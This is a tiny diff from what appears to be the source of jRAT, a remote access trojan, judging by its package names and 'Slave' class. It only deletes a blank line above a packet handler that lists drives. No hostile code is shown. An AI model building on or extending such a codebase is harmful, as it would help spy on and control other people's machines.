@@ -5,7 +5,6 @@ import java.io.DataInputStream;
 import pro.jrat.Drive;
 import pro.jrat.Slave;
 
-
 public class Packet62InitDrives extends AbstractIncomingPacket {
 
 	@Override
